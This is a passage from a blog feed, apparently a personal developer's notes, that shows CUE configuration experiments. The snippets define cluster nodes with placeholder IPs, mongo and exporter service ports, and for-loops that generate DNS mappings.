          port: <span class="hljs-string">&quot;6666&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;<br>                    ]<br>                  &#125;<br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                host: <span class="hljs-string">&quot;6.6.6.6&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: &#123;<br>                    dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                    svcPorts: [<br>                        &#123;<br>                            name: <span class="hljs-string">&quot;test&quot;</span><br>                            port: <span class="hljs-string">&quot;5555&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;,&#123;<br>                            name: <span class="hljs-string">&quot;test2&quot;</span><br>                            port: <span class="hljs-string">&quot;6666&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;<br>                    ]<br>                  &#125;<br>                &#125;<br>                &#125;<br>            &#125;,<br>        ]<br>    &#125;<br>    <br>&#125;<br><br><br><br><br></code></pre></td></tr></table></figure><p>情况1：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><br>cluster: &#123;<br>spec: &#123;<br>nodes: [<br>&#123;<br>name: <span class="hljs-string">&quot;m1&quot;</span><br><span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>host: <span class="hljs-string">&quot;1.1.1.1&quot;</span><br>services: &#123;<br>mongo: &#123;<br>endpoints: [<br>&#123;<br>dns: [<span class="hljs-string">&quot;mongosvc1, mongosvc2&quot;</span>]<br>svcPorts: [<br>&#123;<br>port: <span class="hljs-string">&quot;1111&quot;</span><br>protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>targetPort: <span class="hljs-string">&quot;1111&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;2222&quot;</span><br>protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>targetPort: <span class="hljs-string">&quot;2222&quot;</span><br>&#125;<br>]<br>&#125;,&#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>port: <span class="hljs-string">&quot;3333&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>]<br>&#125;<br>exporter : &#123;<br>endpoints: [<br>&#123;<br>dns: [<span class="hljs-string">&quot;exporter, mongosvc2&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;1111&quot;</span><br>protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;2222&quot;</span><br>protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;,&#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;3333&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>]<br>&#125;<br>&#125;<br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;m2&quot;</span><br><span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>host: <span class="hljs-string">&quot;2.2.2.2&quot;</span><br>services: &#123;<br>mongo : &#123;<br>endpoints: &#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;1111&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;2222&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>&#125;<br>&#125;<br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;n1&quot;</span><br><span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>host: <span class="hljs-string">&quot;5.5.5.5&quot;</span><br>services: &#123;<br>mongo : &#123;<br>endpoints: &#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;5555&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;6666&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>&#125;<br>&#125;<br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;n2&quot;</span><br><span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>host: <span class="hljs-string">&quot;6.6.6.6&quot;</span><br>services: &#123;<br>mongo : &#123;<br>endpoints: &#123;<br>dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>svcPorts: [<br>&#123;<br>name: <span class="hljs-string">&quot;test&quot;</span><br>port: <span class="hljs-string">&quot;5555&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;,&#123;<br>name: <span class="hljs-string">&quot;test2&quot;</span><br>port: <span class="hljs-string">&quot;6666&quot;</span><br>protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>&#125;<br>]<br>&#125;<br>&#125;<br>&#125;<br>&#125;,<br>]<br>&#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cue</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【cue】test</title>
    <link href="/2023/05/18/cue/unsupported/%E3%80%90cue%E3%80%91test/"/>
    <url>/2023/05/18/cue/unsupported/%E3%80%90cue%E3%80%91test/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs bash">NodeConfs: &#123;<br>  master: &#123;<br>    services: &#123;<br>        abcd: &#123;<br>            endpoints: [<br>              &#123;<br>                dns: [<span class="hljs-string">&quot;\(node.name)&quot;</span>]<br>                name: <span class="hljs-string">&quot;test&quot;</span><br>                protocol: <span class="hljs-string">&quot;tcp&quot;</span><br>                ports: <span class="hljs-string">&quot;1234&quot;</span><br>              &#125;<br>            ]<br>        &#125;<br>    &#125;<br>  &#125;<br>  <br>&#125;<br><br><br><br><br>cluster: &#123;<br>    spec: &#123;<br>        nodes: [<br>            &#123;<br>                name: <span class="hljs-string">&quot;m1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard1&quot;</span><br>                &#125;<br>                services: &#123;<br>                mongo :<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;m2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard2&quot;</span><br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard1&quot;</span><br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard2&quot;</span><br>                &#125;<br>            &#125;,<br>        ]<br>    &#125;<br>    <br>&#125;<br><br><br><br>server: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.type)&quot;</span><br>    &#125;<br>&#125;<br><br><br>server2: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.name)&quot;</span><br>    &#125;<br>&#125;<br>  <br>server3: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.vars.shard)&quot;</span><br>    &#125;<br>&#125;  <br><br><br><br><br><br><br><br><br></code></pre></td></tr></table></figure><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">cluster: &#123;<br>    spec: &#123;<br>        nodes: [<br>            &#123;<br>                name: <span class="hljs-string">&quot;m1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard1&quot;</span><br>                &#125;<br>                services: &#123;<br>                mongoA : &#123;<br>                 <br>                <br>                &#125;<br>                mognoB: &#123;<br>                <br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;m2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard2&quot;</span><br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard1&quot;</span><br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                vars: &#123;<br>                    shard: <span class="hljs-string">&quot;shard2&quot;</span><br>                &#125;<br>            &#125;,<br>        ]<br>    &#125;<br>    <br>&#125;<br><br><br><br>server: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.type)&quot;</span><br>    &#125;<br>&#125;<br><br><br>server2: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.name)&quot;</span><br>    &#125;<br>&#125;<br>  <br>server3: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.vars.shard)&quot;</span><br>    &#125;<br>&#125;  <br><br><br><br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs bash">cluster: &#123;<br>    spec: &#123;<br>        nodes: [<br>            &#123;<br>                name: <span class="hljs-string">&quot;m1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: &#123;<br>                    dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                    svcPorts: [<br>                        &#123;<br>                            name: <span class="hljs-string">&quot;test&quot;</span><br>                            port: <span class="hljs-string">&quot;1111&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;,&#123;<br>                            name: <span class="hljs-string">&quot;test2&quot;</span><br>                            port: <span class="hljs-string">&quot;2222&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;<br>                    ]<br>                  &#125;<br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;m2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: &#123;<br>                    dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                    svcPorts: [<br>                        &#123;<br>                            name: <span class="hljs-string">&quot;test&quot;</span><br>                            port: <span class="hljs-string">&quot;1112&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;,&#123;<br>                            name: <span class="hljs-string">&quot;test2&quot;</span><br>                            port: <span class="hljs-string">&quot;2223&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;<br>                    ]<br>                  &#125;<br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>            &#125;,<br>        ]<br>    &#125;   <br>&#125;<br><br><br><br>server: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.type)&quot;</span><br>    &#125;<br>&#125;<br><br><br>server2: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.name)&quot;</span><br>    &#125;<br>&#125;<br>  <br>server3: &#123;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> cluster.spec.nodes &#123;<br>          <span class="hljs-string">&quot;dns-\(v.name)&quot;</span>: <span class="hljs-string">&quot;\(v.vars.shard)&quot;</span><br>    &#125;<br>&#125;  <br><br><br><br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs bash">cluster: &#123;<br>    spec: &#123;<br>        nodes: [<br>            &#123;<br>                name: <span class="hljs-string">&quot;m1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                host: <span class="hljs-string">&quot;1.1.1.1&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: [<br>                      &#123;<br>                        dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                        svcPorts: [<br>                            &#123;<br>                                name: <span class="hljs-string">&quot;test&quot;</span><br>                                port: <span class="hljs-string">&quot;1111&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;,&#123;<br>                                name: <span class="hljs-string">&quot;test2&quot;</span><br>                                port: <span class="hljs-string">&quot;2222&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;<br>                        ]<br>                      &#125;,&#123;<br>                        dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                        svcPorts: [<br>                            &#123;<br>                                name: <span class="hljs-string">&quot;test&quot;</span><br>                                port: <span class="hljs-string">&quot;1111&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;,&#123;<br>                                name: <span class="hljs-string">&quot;test2&quot;</span><br>                                port: <span class="hljs-string">&quot;2222&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;<br>                        ]<br>                      &#125;<br>                  ]<br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;m2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;master&quot;</span><br>                host: <span class="hljs-string">&quot;2.2.2.2&quot;</span><br>                services: &#123;<br>                    mongo : &#123;<br>                      endpoints: &#123;<br>                        dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                        svcPorts: [<br>                            &#123;<br>                                name: <span class="hljs-string">&quot;test&quot;</span><br>                                port: <span class="hljs-string">&quot;1111&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;,&#123;<br>                                name: <span class="hljs-string">&quot;test2&quot;</span><br>                                port: <span class="hljs-string">&quot;2222&quot;</span><br>                                protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                            &#125;<br>                        ]<br>                      &#125;<br>                    &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n1&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                host: <span class="hljs-string">&quot;5.5.5.5&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: &#123;<br>                    dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                    svcPorts: [<br>                        &#123;<br>                            name: <span class="hljs-string">&quot;test&quot;</span><br>                            port: <span class="hljs-string">&quot;5555&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;,&#123;<br>                            name: <span class="hljs-string">&quot;test2&quot;</span><br>                            port: <span class="hljs-string">&quot;6666&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;<br>                    ]<br>                  &#125;<br>                &#125;<br>                &#125;<br>            &#125;,&#123;<br>                name: <span class="hljs-string">&quot;n2&quot;</span><br>                <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;node&quot;</span><br>                host: <span class="hljs-string">&quot;6.6.6.6&quot;</span><br>                services: &#123;<br>                mongo : &#123;<br>                  endpoints: &#123;<br>                    dns: [<span class="hljs-string">&quot;mongo&quot;</span>]<br>                    svcPorts: [<br>                        &#123;<br>                            name: <span class="hljs-string">&quot;test&quot;</span><br>                            port: <span class="hljs-string">&quot;5555&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;,&#123;<br>                            name: <span class="hljs-string">&quot;test2&quot;</span><br>                            port: <span class="hljs-string">&quot;6666&quot;</span><br>                            protocal: <span class="hljs-string">&quot;tcp&quot;</span><br>                        &#125;<br>                    ]<br>                  &#125;<br>                &#125;<br>                &#125;<br>            &#125;,<br>        ]<br>    &#125;<br>    <br>&#125;<br><br><br><br><br></code></pre></td></tr></table></figure><p>情况1：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 